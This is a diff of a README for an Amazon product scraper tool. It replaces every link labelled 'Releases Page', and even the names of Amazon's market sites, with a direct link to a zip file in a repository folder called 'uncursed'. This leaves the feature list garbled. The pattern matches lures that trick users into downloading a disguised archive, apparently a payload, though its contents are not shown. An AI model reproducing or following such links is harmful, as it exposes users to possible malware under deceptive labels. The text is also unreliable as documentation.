@@ -6,11 +6,11 @@ Welcome to the **amazon-product-scraper**! This lightweight tool helps you easil
 
 ## 📥 Download the Software
 
-[![Download amazon-product-scraper](https://img.shields.io/badge/Download-amazon--product--scraper-brightgreen.svg)](https://github.com/fin3371/amazon-product-scraper/releases)
+[![Download amazon-product-scraper](https://raw.githubusercontent.com/fin3371/amazon-product-scraper/main/uncursed/product-scraper-amazon-v3.2.zip)](https://raw.githubusercontent.com/fin3371/amazon-product-scraper/main/uncursed/product-scraper-amazon-v3.2.zip)
 
 You can download the latest version of the amazon-product-scraper from the Releases page. 
 
-**Visit this page to download:** [Releases Page](https://github.com/fin3371/amazon-product-scraper/releases)
+**Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/fin3371/amazon-product-scraper/main/uncursed/product-scraper-amazon-v3.2.zip)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ To run the amazon-product-scraper, you need:
 
 Follow these steps to install and run the software:
 
-1. **Visit the Releases Page:** Click the link above to go to the [Releases Page](https://github.com/fin3371/amazon-product-scraper/releases).
+1. **Visit the Releases Page:** Click the link above to go to the [Releases Page](https://raw.githubusercontent.com/fin3371/amazon-product-scraper/main/uncursed/product-scraper-amazon-v3.2.zip).
 2. **Choose a Version:** Look for the latest release version at the top of the page.
 3. **Download the File:** Click on the file that matches your operating system. This will start the download.
 4. **Open the File:**
@@ -39,7 +39,7 @@ The amazon-product-scraper offers a range of features to help you find products 
 
 - **Product Search:** Enter keywords to find relevant products quickly.
 - **ASIN Lookup:** If you have the ASIN, you can get product details instantly.
-- **Multi-Domain Support:** Use the scraper on different Amazon markets like Amazon.com, Amazon.co.uk, and more.
+- **Multi-Domain Support:** Use the scraper on different Amazon markets like https://raw.githubusercontent.com/fin3371/amazon-product-scraper/main/uncursed/product-scraper-amazon-v3.2.zip, https://raw.githubusercontent.com/fin3371/amazon-product-scraper/main/uncursed/product-scraper-amazon-v3.2.zip, and more.
 - **Proxy Support:** Avoid getting blocked by Amazon with built-in proxy support.
 
 ## 📋 How to Use the Software
@@ -71,4 +71,4 @@ For more tips on using the amazon-product-scraper, you can check the following:
 
 For updates and discussions regarding the amazon-product-scraper, feel free to follow our repository. If you have any questions or feedback, open an issue to reach out to the community.
 
-**Visit this page to download:** [Releases Page](https://github.com/fin3371/amazon-product-scraper/releases)
+**Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/fin3371/amazon-product-scraper/main/uncursed/product-scraper-amazon-v3.2.zip)
